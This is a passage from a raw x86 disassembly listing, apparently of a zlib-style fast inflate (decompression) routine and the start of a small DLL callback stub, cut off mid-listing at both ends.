  408f36:	e9 d5 fd ff ff       	jmp    0x408d10
  408f3b:	39 c2                	cmp    %eax,%edx
  408f3d:	0f 87 48 fb ff ff    	ja     0x408a8b
  408f43:	89 44 24 20          	mov    %eax,0x20(%esp)
  408f47:	89 d0                	mov    %edx,%eax
  408f49:	e9 41 fb ff ff       	jmp    0x408a8f
  408f4e:	81 c4 84 00 00 00    	add    $0x84,%esp
  408f54:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  408f59:	5b                   	pop    %ebx
  408f5a:	5e                   	pop    %esi
  408f5b:	5f                   	pop    %edi
  408f5c:	5d                   	pop    %ebp
  408f5d:	c3                   	ret
  408f5e:	66 90                	xchg   %ax,%ax
  408f60:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  408f67:	00 
  408f68:	e9 7e fe ff ff       	jmp    0x408deb
  408f6d:	8d 76 00             	lea    0x0(%esi),%esi
  408f70:	31 ff                	xor    %edi,%edi
  408f72:	c6 44 24 40 60       	movb   $0x60,0x40(%esp)
  408f77:	e9 cf fd ff ff       	jmp    0x408d4b
  408f7c:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  408f80:	0f b6 5c 24 41       	movzbl 0x41(%esp),%ebx
  408f85:	85 c9                	test   %ecx,%ecx
  408f87:	74 17                	je     0x408fa0
  408f89:	8b 44 24 14          	mov    0x14(%esp),%eax
  408f8d:	8b 74 24 08          	mov    0x8(%esp),%esi
  408f91:	31 d2                	xor    %edx,%edx
  408f93:	8d 04 b0             	lea    (%eax,%esi,4),%eax
  408f96:	c6 00 40             	movb   $0x40,(%eax)
  408f99:	88 58 01             	mov    %bl,0x1(%eax)
  408f9c:	66 89 50 02          	mov    %dx,0x2(%eax)
  408fa0:	8b 9c 24 a4 00 00 00 	mov    0xa4(%esp),%ebx
  408fa7:	8b 44 24 24          	mov    0x24(%esp),%eax
  408fab:	c1 e0 02             	shl    $0x2,%eax
  408fae:	01 03                	add    %eax,(%ebx)
  408fb0:	8b 84 24 a8 00 00 00 	mov    0xa8(%esp),%eax
  408fb7:	8b 5c 24 1c          	mov    0x1c(%esp),%ebx
  408fbb:	89 18                	mov    %ebx,(%eax)
  408fbd:	31 c0                	xor    %eax,%eax
  408fbf:	e9 a1 fc ff ff       	jmp    0x408c65
  408fc4:	90                   	nop
  408fc5:	90                   	nop
  408fc6:	90                   	nop
  408fc7:	90                   	nop
  408fc8:	90                   	nop
  408fc9:	90                   	nop
  408fca:	90                   	nop
  408fcb:	90                   	nop
  408fcc:	90                   	nop
  408fcd:	90                   	nop
  408fce:	90                   	nop
  408fcf:	90                   	nop
  408fd0:	55                   	push   %ebp
  408fd1:	57                   	push   %edi
  408fd2:	56                   	push   %esi
  408fd3:	53                   	push   %ebx
  408fd4:	83 ec 44             	sub    $0x44,%esp
  408fd7:	8b 44 24 58          	mov    0x58(%esp),%eax
  408fdb:	8b 40 1c             	mov    0x1c(%eax),%eax
  408fde:	89 c7                	mov    %eax,%edi
  408fe0:	89 44 24 0c          	mov    %eax,0xc(%esp)
  408fe4:	8b 44 24 58          	mov    0x58(%esp),%eax
  408fe8:	8b 00                	mov    (%eax),%eax
  408fea:	83 e8 01             	sub    $0x1,%eax
  408fed:	89 c2                	mov    %eax,%edx
  408fef:	89 44 24 04          	mov    %eax,0x4(%esp)
  408ff3:	8b 44 24 58          	mov    0x58(%esp),%eax
  408ff7:	8b 40 04             	mov    0x4(%eax),%eax
  408ffa:	8d 44 02 fb          	lea    -0x5(%edx,%eax,1),%eax
  408ffe:	89 44 24 10          	mov    %eax,0x10(%esp)
  409002:	8b 44 24 58          	mov    0x58(%esp),%eax
  409006:	8b 40 0c             	mov    0xc(%eax),%eax
  409009:	83 e8 01             	sub    $0x1,%eax
  40900c:	89 c6                	mov    %eax,%esi
  40900e:	89 44 24 08          	mov    %eax,0x8(%esp)
  409012:	8b 44 24 58          	mov    0x58(%esp),%eax
  409016:	8b 40 10             	mov    0x10(%eax),%eax
  409019:	89 c2                	mov    %eax,%edx
  40901b:	8d 84 06 ff fe ff ff 	lea    -0x101(%esi,%eax,1),%eax
  409022:	2b 54 24 5c          	sub    0x5c(%esp),%edx
  409026:	89 44 24 14          	mov    %eax,0x14(%esp)
  40902a:	89 f8                	mov    %edi,%eax
  40902c:	8b 7f 28             	mov    0x28(%edi),%edi
  40902f:	8b 58 4c             	mov    0x4c(%eax),%ebx
  409032:	8b 68 3c             	mov    0x3c(%eax),%ebp
  409035:	01 f2                	add    %esi,%edx
  409037:	89 7c 24 20          	mov    %edi,0x20(%esp)
  40903b:	8b 78 30             	mov    0x30(%eax),%edi
  40903e:	89 54 24 30          	mov    %edx,0x30(%esp)
  409042:	8b 50 2c             	mov    0x2c(%eax),%edx
  409045:	89 fe                	mov    %edi,%esi
  409047:	89 7c 24 2c          	mov    %edi,0x2c(%esp)
  40904b:	8b 78 34             	mov    0x34(%eax),%edi
  40904e:	89 54 24 34          	mov    %edx,0x34(%esp)
  409052:	8b 50 38             	mov    0x38(%eax),%edx
  409055:	89 7c 24 24          	mov    %edi,0x24(%esp)
  409059:	89 1c 24             	mov    %ebx,(%esp)
  40905c:	89 c7                	mov    %eax,%edi
  40905e:	8b 58 50             	mov    0x50(%eax),%ebx
  409061:	8b 48 54             	mov    0x54(%eax),%ecx
  409064:	b8 01 00 00 00       	mov    $0x1,%eax
  409069:	89 5c 24 1c          	mov    %ebx,0x1c(%esp)
  40906d:	89 c3                	mov    %eax,%ebx
  40906f:	d3 e3                	shl    %cl,%ebx
  409071:	8b 4f 58             	mov    0x58(%edi),%ecx
  409074:	8b 7c 24 24          	mov    0x24(%esp),%edi
  409078:	8d 5b ff             	lea    -0x1(%ebx),%ebx
  40907b:	d3 e0                	shl    %cl,%eax
  40907d:	89 5c 24 18          	mov    %ebx,0x18(%esp)
  409081:	8d 58 ff             	lea    -0x1(%eax),%ebx
  409084:	89 5c 24 28          	mov    %ebx,0x28(%esp)
  409088:	8d 5f ff             	lea    -0x1(%edi),%ebx
  40908b:	8b 7c 24 20          	mov    0x20(%esp),%edi
  40908f:	89 5c 24 38          	mov    %ebx,0x38(%esp)
  409093:	01 f7                	add    %esi,%edi
  409095:	89 7c 24 40          	mov    %edi,0x40(%esp)
  409099:	83 fd 0e             	cmp    $0xe,%ebp
  40909c:	77 25                	ja     0x4090c3
  40909e:	8b 7c 24 04          	mov    0x4(%esp),%edi
  4090a2:	89 e9                	mov    %ebp,%ecx
  4090a4:	0f b6 5f 01          	movzbl 0x1(%edi),%ebx
  4090a8:	0f b6 47 02          	movzbl 0x2(%edi),%eax
  4090ac:	d3 e3                	shl    %cl,%ebx
  4090ae:	8d 4d 08             	lea    0x8(%ebp),%ecx
  4090b1:	83 c5 10             	add    $0x10,%ebp
  4090b4:	d3 e0                	shl    %cl,%eax
  4090b6:	01 c3                	add    %eax,%ebx
  4090b8:	89 f8                	mov    %edi,%eax
  4090ba:	83 c0 02             	add    $0x2,%eax
  4090bd:	01 da                	add    %ebx,%edx
  4090bf:	89 44 24 04          	mov    %eax,0x4(%esp)
  4090c3:	8b 44 24 18          	mov    0x18(%esp),%eax
  4090c7:	8b 3c 24             	mov    (%esp),%edi
  4090ca:	21 d0                	and    %edx,%eax
  4090cc:	8d 04 87             	lea    (%edi,%eax,4),%eax
  4090cf:	0f b6 70 01          	movzbl 0x1(%eax),%esi
  4090d3:	0f b6 18             	movzbl (%eax),%ebx
  4090d6:	0f b7 40 02          	movzwl 0x2(%eax),%eax
  4090da:	89 f1                	mov    %esi,%ecx
  4090dc:	29 f5                	sub    %esi,%ebp
  4090de:	d3 ea                	shr    %cl,%edx
  4090e0:	84 db                	test   %bl,%bl
  4090e2:	74 58                	je     0x40913c
  4090e4:	f6 c3 10             	test   $0x10,%bl
  4090e7:	0f 85 e3 00 00 00    	jne    0x4091d0
  4090ed:	f6 c3 40             	test   $0x40,%bl
  4090f0:	0f 85 ba 02 00 00    	jne    0x4093b0
  4090f6:	bf 01 00 00 00       	mov    $0x1,%edi
  4090fb:	eb 15                	jmp    0x409112
  4090fd:	8d 76 00             	lea    0x0(%esi),%esi
  409100:	f6 c3 10             	test   $0x10,%bl
  409103:	0f 85 c7 00 00 00    	jne    0x4091d0
  409109:	f6 c3 40             	test   $0x40,%bl
  40910c:	0f 85 9e 02 00 00    	jne    0x4093b0
  409112:	89 d9                	mov    %ebx,%ecx
  409114:	89 fe                	mov    %edi,%esi
  409116:	d3 e6                	shl    %cl,%esi
  409118:	89 f1                	mov    %esi,%ecx
  40911a:	83 e9 01             	sub    $0x1,%ecx
  40911d:	21 d1                	and    %edx,%ecx
  40911f:	01 c1                	add    %eax,%ecx
  409121:	8b 04 24             	mov    (%esp),%eax
  409124:	8d 04 88             	lea    (%eax,%ecx,4),%eax
  409127:	0f b6 70 01          	movzbl 0x1(%eax),%esi
  40912b:	0f b6 18             	movzbl (%eax),%ebx
  40912e:	0f b7 40 02          	movzwl 0x2(%eax),%eax
  409132:	89 f1                	mov    %esi,%ecx
  409134:	29 f5                	sub    %esi,%ebp
  409136:	d3 ea                	shr    %cl,%edx
  409138:	84 db                	test   %bl,%bl
  40913a:	75 c4                	jne    0x409100
  40913c:	8b 7c 24 08          	mov    0x8(%esp),%edi
  409140:	88 47 01             	mov    %al,0x1(%edi)
  409143:	8d 47 01             	lea    0x1(%edi),%eax
  409146:	89 44 24 08          	mov    %eax,0x8(%esp)
  40914a:	8b 7c 24 14          	mov    0x14(%esp),%edi
  40914e:	39 7c 24 08          	cmp    %edi,0x8(%esp)
  409152:	73 0e                	jae    0x409162
  409154:	8b 7c 24 10          	mov    0x10(%esp),%edi
  409158:	39 7c 24 04          	cmp    %edi,0x4(%esp)
  40915c:	0f 82 37 ff ff ff    	jb     0x409099
  409162:	8b 44 24 04          	mov    0x4(%esp),%eax
  409166:	89 e9                	mov    %ebp,%ecx
  409168:	bb 01 00 00 00       	mov    $0x1,%ebx
  40916d:	c1 e9 03             	shr    $0x3,%ecx
  409170:	8b 7c 24 58          	mov    0x58(%esp),%edi
  409174:	8b 74 24 58          	mov    0x58(%esp),%esi
  409178:	29 c8                	sub    %ecx,%eax
  40917a:	c1 e1 03             	shl    $0x3,%ecx
  40917d:	29 cd                	sub    %ecx,%ebp
  40917f:	89 e9                	mov    %ebp,%ecx
  409181:	d3 e3                	shl    %cl,%ebx
  409183:	83 eb 01             	sub    $0x1,%ebx
  409186:	21 da                	and    %ebx,%edx
  409188:	8d 58 01             	lea    0x1(%eax),%ebx
  40918b:	89 1f                	mov    %ebx,(%edi)
  40918d:	8b 7c 24 08          	mov    0x8(%esp),%edi
  409191:	8d 5f 01             	lea    0x1(%edi),%ebx
  409194:	89 5e 0c             	mov    %ebx,0xc(%esi)
  409197:	8b 74 24 10          	mov    0x10(%esp),%esi
  40919b:	29 c6                	sub    %eax,%esi
  40919d:	89 f0                	mov    %esi,%eax
  40919f:	8b 74 24 58          	mov    0x58(%esp),%esi
  4091a3:	83 c0 05             	add    $0x5,%eax
  4091a6:	89 46 04             	mov    %eax,0x4(%esi)
  4091a9:	8b 44 24 14          	mov    0x14(%esp),%eax
  4091ad:	29 f8                	sub    %edi,%eax
  4091af:	05 01 01 00 00       	add    $0x101,%eax
  4091b4:	89 46 10             	mov    %eax,0x10(%esi)
  4091b7:	8b 44 24 0c          	mov    0xc(%esp),%eax
  4091bb:	89 50 38             	mov    %edx,0x38(%eax)
  4091be:	89 68 3c             	mov    %ebp,0x3c(%eax)
  4091c1:	83 c4 44             	add    $0x44,%esp
  4091c4:	5b                   	pop    %ebx
  4091c5:	5e                   	pop    %esi
  4091c6:	5f                   	pop    %edi
  4091c7:	5d                   	pop    %ebp
  4091c8:	c3                   	ret
  4091c9:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  4091d0:	83 e3 0f             	and    $0xf,%ebx
  4091d3:	0f b7 f8             	movzwl %ax,%edi
  4091d6:	74 37                	je     0x40920f
  4091d8:	0f b6 f3             	movzbl %bl,%esi
  4091db:	39 ee                	cmp    %ebp,%esi
  4091dd:	76 1c                	jbe    0x4091fb
  4091df:	8b 44 24 04          	mov    0x4(%esp),%eax
  4091e3:	89 e9                	mov    %ebp,%ecx
  4091e5:	83 c5 08             	add    $0x8,%ebp
  4091e8:	0f b6 40 01          	movzbl 0x1(%eax),%eax
  4091ec:	d3 e0                	shl    %cl,%eax
  4091ee:	01 c2                	add    %eax,%edx
  4091f0:	8b 44 24 04          	mov    0x4(%esp),%eax
  4091f4:	83 c0 01             	add    $0x1,%eax
  4091f7:	89 44 24 04          	mov    %eax,0x4(%esp)
  4091fb:	89 d9                	mov    %ebx,%ecx
  4091fd:	b8 01 00 00 00       	mov    $0x1,%eax
  409202:	29 f5                	sub    %esi,%ebp
  409204:	d3 e0                	shl    %cl,%eax
  409206:	83 e8 01             	sub    $0x1,%eax
  409209:	21 d0                	and    %edx,%eax
  40920b:	d3 ea                	shr    %cl,%edx
  40920d:	01 c7                	add    %eax,%edi
  40920f:	83 fd 0e             	cmp    $0xe,%ebp
  409212:	0f 86 b8 01 00 00    	jbe    0x4093d0
  409218:	8b 44 24 28          	mov    0x28(%esp),%eax
  40921c:	8b 74 24 1c          	mov    0x1c(%esp),%esi
  409220:	21 d0                	and    %edx,%eax
  409222:	8d 04 86             	lea    (%esi,%eax,4),%eax
  409225:	0f b6 70 01          	movzbl 0x1(%eax),%esi
  409229:	0f b6 18             	movzbl (%eax),%ebx
  40922c:	0f b7 40 02          	movzwl 0x2(%eax),%eax
  409230:	89 f1                	mov    %esi,%ecx
  409232:	29 f5                	sub    %esi,%ebp
  409234:	d3 ea                	shr    %cl,%edx
  409236:	f6 c3 10             	test   $0x10,%bl
  409239:	75 4d                	jne    0x409288
  40923b:	f6 c3 40             	test   $0x40,%bl
  40923e:	0f 85 dc 01 00 00    	jne    0x409420
  409244:	89 7c 24 3c          	mov    %edi,0x3c(%esp)
  409248:	8b 7c 24 1c          	mov    0x1c(%esp),%edi
  40924c:	eb 0b                	jmp    0x409259
  40924e:	66 90                	xchg   %ax,%ax
  409250:	f6 c3 40             	test   $0x40,%bl
  409253:	0f 85 c7 01 00 00    	jne    0x409420
  409259:	89 d9                	mov    %ebx,%ecx
  40925b:	be 01 00 00 00       	mov    $0x1,%esi
  409260:	d3 e6                	shl    %cl,%esi
  409262:	89 f1                	mov    %esi,%ecx
  409264:	83 e9 01             	sub    $0x1,%ecx
  409267:	21 d1                	and    %edx,%ecx
  409269:	01 c1                	add    %eax,%ecx
  40926b:	8d 04 8f             	lea    (%edi,%ecx,4),%eax
  40926e:	0f b6 70 01          	movzbl 0x1(%eax),%esi
  409272:	0f b6 18             	movzbl (%eax),%ebx
  409275:	0f b7 40 02          	movzwl 0x2(%eax),%eax
  409279:	89 f1                	mov    %esi,%ecx
  40927b:	29 f5                	sub    %esi,%ebp
  40927d:	d3 ea                	shr    %cl,%edx
  40927f:	f6 c3 10             	test   $0x10,%bl
  409282:	74 cc                	je     0x409250
  409284:	8b 7c 24 3c          	mov    0x3c(%esp),%edi
  409288:	83 e3 0f             	and    $0xf,%ebx
  40928b:	89 44 24 3c          	mov    %eax,0x3c(%esp)
  40928f:	0f b6 f3             	movzbl %bl,%esi
  409292:	39 ee                	cmp    %ebp,%esi
  409294:	76 20                	jbe    0x4092b6
  409296:	8b 44 24 04          	mov    0x4(%esp),%eax
  40929a:	89 e9                	mov    %ebp,%ecx
  40929c:	0f b6 40 01          	movzbl 0x1(%eax),%eax
  4092a0:	d3 e0                	shl    %cl,%eax
  4092a2:	8d 4d 08             	lea    0x8(%ebp),%ecx
  4092a5:	01 c2                	add    %eax,%edx
  4092a7:	39 ce                	cmp    %ecx,%esi
  4092a9:	0f 87 8a 02 00 00    	ja     0x409539
  4092af:	83 44 24 04 01       	addl   $0x1,0x4(%esp)
  4092b4:	89 cd                	mov    %ecx,%ebp
  4092b6:	89 d9                	mov    %ebx,%ecx
  4092b8:	b8 01 00 00 00       	mov    $0x1,%eax
  4092bd:	29 f5                	sub    %esi,%ebp
  4092bf:	d3 e0                	shl    %cl,%eax
  4092c1:	83 e8 01             	sub    $0x1,%eax
  4092c4:	21 d0                	and    %edx,%eax
  4092c6:	03 44 24 3c          	add    0x3c(%esp),%eax
  4092ca:	d3 ea                	shr    %cl,%edx
  4092cc:	89 44 24 3c          	mov    %eax,0x3c(%esp)
  4092d0:	8b 44 24 08          	mov    0x8(%esp),%eax
  4092d4:	2b 44 24 30          	sub    0x30(%esp),%eax
  4092d8:	39 44 24 3c          	cmp    %eax,0x3c(%esp)
  4092dc:	0f 86 58 01 00 00    	jbe    0x40943a
  4092e2:	8b 4c 24 3c          	mov    0x3c(%esp),%ecx
  4092e6:	29 c1                	sub    %eax,%ecx
  4092e8:	39 4c 24 34          	cmp    %ecx,0x34(%esp)
  4092ec:	73 12                	jae    0x409300
  4092ee:	8b 44 24 0c          	mov    0xc(%esp),%eax
  4092f2:	8b 98 c0 1b 00 00    	mov    0x1bc0(%eax),%ebx
  4092f8:	85 db                	test   %ebx,%ebx
  4092fa:	0f 85 a8 02 00 00    	jne    0x4095a8
  409300:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  409304:	85 c0                	test   %eax,%eax
  409306:	0f 85 a2 01 00 00    	jne    0x4094ae
  40930c:	8b 44 24 20          	mov    0x20(%esp),%eax
  409310:	29 c8                	sub    %ecx,%eax
  409312:	03 44 24 38          	add    0x38(%esp),%eax
  409316:	39 cf                	cmp    %ecx,%edi
  409318:	76 31                	jbe    0x40934b
  40931a:	8b 74 24 08          	mov    0x8(%esp),%esi
  40931e:	29 cf                	sub    %ecx,%edi
  409320:	89 f3                	mov    %esi,%ebx
  409322:	01 f1                	add    %esi,%ecx
  409324:	89 d6                	mov    %edx,%esi
  409326:	8d 76 00             	lea    0x0(%esi),%esi
  409329:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  409330:	83 c0 01             	add    $0x1,%eax
  409333:	0f b6 10             	movzbl (%eax),%edx
  409336:	83 c3 01             	add    $0x1,%ebx
  409339:	39 cb                	cmp    %ecx,%ebx
  40933b:	88 13                	mov    %dl,(%ebx)
  40933d:	75 f1                	jne    0x409330
  40933f:	89 d8                	mov    %ebx,%eax
  409341:	2b 44 24 3c          	sub    0x3c(%esp),%eax
  409345:	89 5c 24 08          	mov    %ebx,0x8(%esp)
  409349:	89 f2                	mov    %esi,%edx
  40934b:	83 ff 02             	cmp    $0x2,%edi
  40934e:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  409352:	76 25                	jbe    0x409379
  409354:	0f b6 58 01          	movzbl 0x1(%eax),%ebx
  409358:	83 c0 03             	add    $0x3,%eax
  40935b:	83 ef 03             	sub    $0x3,%edi
  40935e:	83 c1 03             	add    $0x3,%ecx
  409361:	88 59 fe             	mov    %bl,-0x2(%ecx)
  409364:	0f b6 58 ff          	movzbl -0x1(%eax),%ebx
  409368:	88 59 ff             	mov    %bl,-0x1(%ecx)
  40936b:	0f b6 18             	movzbl (%eax),%ebx
  40936e:	83 ff 02             	cmp    $0x2,%edi
  409371:	88 19                	mov    %bl,(%ecx)
  409373:	77 df                	ja     0x409354
  409375:	89 4c 24 08          	mov    %ecx,0x8(%esp)
  409379:	85 ff                	test   %edi,%edi
  40937b:	0f 84 c9 fd ff ff    	je     0x40914a
  409381:	0f b6 48 01          	movzbl 0x1(%eax),%ecx
  409385:	8b 74 24 08          	mov    0x8(%esp),%esi
  409389:	83 ff 02             	cmp    $0x2,%edi
  40938c:	88 4e 01             	mov    %cl,0x1(%esi)
  40938f:	0f 85 ff 01 00 00    	jne    0x409594
  409395:	0f b6 40 02          	movzbl 0x2(%eax),%eax
  409399:	8b 7c 24 08          	mov    0x8(%esp),%edi
  40939d:	88 47 02             	mov    %al,0x2(%edi)
  4093a0:	8d 47 02             	lea    0x2(%edi),%eax
  4093a3:	89 44 24 08          	mov    %eax,0x8(%esp)
  4093a7:	e9 9e fd ff ff       	jmp    0x40914a
  4093ac:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  4093b0:	89 de                	mov    %ebx,%esi
  4093b2:	83 e6 20             	and    $0x20,%esi
  4093b5:	74 49                	je     0x409400
  4093b7:	8b 44 24 0c          	mov    0xc(%esp),%eax
  4093bb:	c7 00 0b 00 00 00    	movl   $0xb,(%eax)
  4093c1:	e9 9c fd ff ff       	jmp    0x409162
  4093c6:	8d 76 00             	lea    0x0(%esi),%esi
  4093c9:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  4093d0:	8b 74 24 04          	mov    0x4(%esp),%esi
  4093d4:	89 e9                	mov    %ebp,%ecx
  4093d6:	0f b6 5e 01          	movzbl 0x1(%esi),%ebx
  4093da:	0f b6 46 02          	movzbl 0x2(%esi),%eax
  4093de:	d3 e3                	shl    %cl,%ebx
  4093e0:	8d 4d 08             	lea    0x8(%ebp),%ecx
  4093e3:	83 c5 10             	add    $0x10,%ebp
  4093e6:	d3 e0                	shl    %cl,%eax
  4093e8:	01 c3                	add    %eax,%ebx
  4093ea:	89 f0                	mov    %esi,%eax
  4093ec:	83 c0 02             	add    $0x2,%eax
  4093ef:	01 da                	add    %ebx,%edx
  4093f1:	89 44 24 04          	mov    %eax,0x4(%esp)
  4093f5:	e9 1e fe ff ff       	jmp    0x409218
  4093fa:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  409400:	8b 44 24 58          	mov    0x58(%esp),%eax
  409404:	c7 40 18 34 02 41 00 	movl   $0x410234,0x18(%eax)
  40940b:	8b 44 24 0c          	mov    0xc(%esp),%eax
  40940f:	c7 00 1d 00 00 00    	movl   $0x1d,(%eax)
  409415:	e9 48 fd ff ff       	jmp    0x409162
  40941a:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  409420:	8b 44 24 58          	mov    0x58(%esp),%eax
  409424:	c7 40 18 1e 02 41 00 	movl   $0x41021e,0x18(%eax)
  40942b:	8b 44 24 0c          	mov    0xc(%esp),%eax
  40942f:	c7 00 1d 00 00 00    	movl   $0x1d,(%eax)
  409435:	e9 28 fd ff ff       	jmp    0x409162
  40943a:	8b 5c 24 08          	mov    0x8(%esp),%ebx
  40943e:	89 d8                	mov    %ebx,%eax
  409440:	2b 44 24 3c          	sub    0x3c(%esp),%eax
  409444:	89 54 24 3c          	mov    %edx,0x3c(%esp)
  409448:	eb 0a                	jmp    0x409454
  40944a:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  409450:	89 f0                	mov    %esi,%eax
  409452:	89 cb                	mov    %ecx,%ebx
  409454:	0f b6 48 01          	movzbl 0x1(%eax),%ecx
  409458:	83 ef 03             	sub    $0x3,%edi
  40945b:	8d 70 03             	lea    0x3(%eax),%esi
  40945e:	83 ff 02             	cmp    $0x2,%edi
  409461:	88 4b 01             	mov    %cl,0x1(%ebx)
  409464:	0f b6 48 02          	movzbl 0x2(%eax),%ecx
  409468:	88 4b 02             	mov    %cl,0x2(%ebx)
  40946b:	0f b6 50 03          	movzbl 0x3(%eax),%edx
  40946f:	8d 4b 03             	lea    0x3(%ebx),%ecx
  409472:	88 53 03             	mov    %dl,0x3(%ebx)
  409475:	77 d9                	ja     0x409450
  409477:	85 ff                	test   %edi,%edi
  409479:	89 5c 24 08          	mov    %ebx,0x8(%esp)
  40947d:	8b 54 24 3c          	mov    0x3c(%esp),%edx
  409481:	0f 84 d1 00 00 00    	je     0x409558
  409487:	0f b6 48 04          	movzbl 0x4(%eax),%ecx
  40948b:	83 ff 02             	cmp    $0x2,%edi
  40948e:	88 4b 04             	mov    %cl,0x4(%ebx)
  409491:	0f 85 07 01 00 00    	jne    0x40959e
  409497:	0f b6 40 05          	movzbl 0x5(%eax),%eax
  40949b:	8b 7c 24 08          	mov    0x8(%esp),%edi
  40949f:	88 47 05             	mov    %al,0x5(%edi)
  4094a2:	8d 47 05             	lea    0x5(%edi),%eax
  4094a5:	89 44 24 08          	mov    %eax,0x8(%esp)
  4094a9:	e9 9c fc ff ff       	jmp    0x40914a
  4094ae:	39 4c 24 2c          	cmp    %ecx,0x2c(%esp)
  4094b2:	0f 83 a9 00 00 00    	jae    0x409561
  4094b8:	8b 44 24 40          	mov    0x40(%esp),%eax
  4094bc:	29 c8                	sub    %ecx,%eax
  4094be:	2b 4c 24 2c          	sub    0x2c(%esp),%ecx
  4094c2:	03 44 24 38          	add    0x38(%esp),%eax
  4094c6:	39 cf                	cmp    %ecx,%edi
  4094c8:	0f 86 7d fe ff ff    	jbe    0x40934b
  4094ce:	8b 74 24 08          	mov    0x8(%esp),%esi
  4094d2:	29 cf                	sub    %ecx,%edi
  4094d4:	89 f3                	mov    %esi,%ebx
  4094d6:	01 f1                	add    %esi,%ecx
  4094d8:	89 d6                	mov    %edx,%esi
  4094da:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  4094e0:	83 c0 01             	add    $0x1,%eax
  4094e3:	0f b6 10             	movzbl (%eax),%edx
  4094e6:	83 c3 01             	add    $0x1,%ebx
  4094e9:	39 cb                	cmp    %ecx,%ebx
  4094eb:	88 13                	mov    %dl,(%ebx)
  4094ed:	75 f1                	jne    0x4094e0
  4094ef:	39 7c 24 2c          	cmp    %edi,0x2c(%esp)
  4094f3:	89 5c 24 08          	mov    %ebx,0x8(%esp)
  4094f7:	89 f2                	mov    %esi,%edx
  4094f9:	8b 44 24 38          	mov    0x38(%esp),%eax
  4094fd:	0f 83 48 fe ff ff    	jae    0x40934b
  409503:	8b 5c 24 2c          	mov    0x2c(%esp),%ebx
  409507:	8b 74 24 24          	mov    0x24(%esp),%esi
  40950b:	31 c0                	xor    %eax,%eax
  40950d:	89 54 24 08          	mov    %edx,0x8(%esp)
  409511:	29 df                	sub    %ebx,%edi
  409513:	0f b6 14 06          	movzbl (%esi,%eax,1),%edx
  409517:	88 54 01 01          	mov    %dl,0x1(%ecx,%eax,1)
  40951b:	83 c0 01             	add    $0x1,%eax
  40951e:	39 d8                	cmp    %ebx,%eax
  409520:	75 f1                	jne    0x409513
  409522:	03 4c 24 2c          	add    0x2c(%esp),%ecx
  409526:	8b 54 24 08          	mov    0x8(%esp),%edx
  40952a:	89 c8                	mov    %ecx,%eax
  40952c:	89 4c 24 08          	mov    %ecx,0x8(%esp)
  409530:	2b 44 24 3c          	sub    0x3c(%esp),%eax
  409534:	e9 12 fe ff ff       	jmp    0x40934b
  409539:	8b 44 24 04          	mov    0x4(%esp),%eax
  40953d:	83 c5 10             	add    $0x10,%ebp
  409540:	0f b6 40 02          	movzbl 0x2(%eax),%eax
  409544:	d3 e0                	shl    %cl,%eax
  409546:	01 c2                	add    %eax,%edx
  409548:	8b 44 24 04          	mov    0x4(%esp),%eax
  40954c:	83 c0 02             	add    $0x2,%eax
  40954f:	89 44 24 04          	mov    %eax,0x4(%esp)
  409553:	e9 5e fd ff ff       	jmp    0x4092b6
  409558:	89 4c 24 08          	mov    %ecx,0x8(%esp)
  40955c:	e9 e9 fb ff ff       	jmp    0x40914a
  409561:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  409565:	29 c8                	sub    %ecx,%eax
  409567:	03 44 24 38          	add    0x38(%esp),%eax
  40956b:	39 cf                	cmp    %ecx,%edi
  40956d:	0f 86 d8 fd ff ff    	jbe    0x40934b
  409573:	8b 74 24 08          	mov    0x8(%esp),%esi
  409577:	29 cf                	sub    %ecx,%edi
  409579:	89 f3                	mov    %esi,%ebx
  40957b:	01 f1                	add    %esi,%ecx
  40957d:	89 d6                	mov    %edx,%esi
  40957f:	90                   	nop
  409580:	83 c0 01             	add    $0x1,%eax
  409583:	0f b6 10             	movzbl (%eax),%edx
  409586:	83 c3 01             	add    $0x1,%ebx
  409589:	39 cb                	cmp    %ecx,%ebx
  40958b:	88 13                	mov    %dl,(%ebx)
  40958d:	75 f1                	jne    0x409580
  40958f:	e9 ab fd ff ff       	jmp    0x40933f
  409594:	83 44 24 08 01       	addl   $0x1,0x8(%esp)
  409599:	e9 ac fb ff ff       	jmp    0x40914a
  40959e:	83 44 24 08 04       	addl   $0x4,0x8(%esp)
  4095a3:	e9 a2 fb ff ff       	jmp    0x40914a
  4095a8:	8b 44 24 58          	mov    0x58(%esp),%eax
  4095ac:	c7 40 18 00 02 41 00 	movl   $0x410200,0x18(%eax)
  4095b3:	8b 44 24 0c          	mov    0xc(%esp),%eax
  4095b7:	c7 00 1d 00 00 00    	movl   $0x1d,(%eax)
  4095bd:	e9 a0 fb ff ff       	jmp    0x409162
  4095c2:	90                   	nop
  4095c3:	90                   	nop
  4095c4:	90                   	nop
  4095c5:	90                   	nop
  4095c6:	90                   	nop
  4095c7:	90                   	nop
  4095c8:	90                   	nop
  4095c9:	90                   	nop
  4095ca:	90                   	nop
  4095cb:	90                   	nop
  4095cc:	90                   	nop
  4095cd:	90                   	nop
  4095ce:	90                   	nop
  4095cf:	90                   	nop
  4095d0:	83 ec 1c             	sub    $0x1c,%esp
  4095d3:	8b 44 24 24          	mov    0x24(%esp),%eax
  4095d7:	85 c0                	test   %eax,%eax
  4095d9:	74 15                	je     0x4095f0
  4095db:	83 f8 03             	cmp    $0x3,%eax
  4095de:	74 10                	je     0x4095f0
  4095e0:	b8 01 00 00 00       	mov    $0x1,%eax
  4095e5:	83 c4 1c             	add    $0x1c,%esp
  4095e8:	c2 0c 00             	ret    $0xc
  4095eb:	90                   	nop
  4095ec:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  4095f0:	8b 54 24 28          	mov    0x28(%esp),%edx
  4095f4:	89 44 24 04          	mov    %eax,0x4(%esp)
  4095f8:	8b 44 24 20          	mov    0x20(%esp),%eax
  4095fc:	89 54 24 08          	mov    %edx,0x8(%esp)
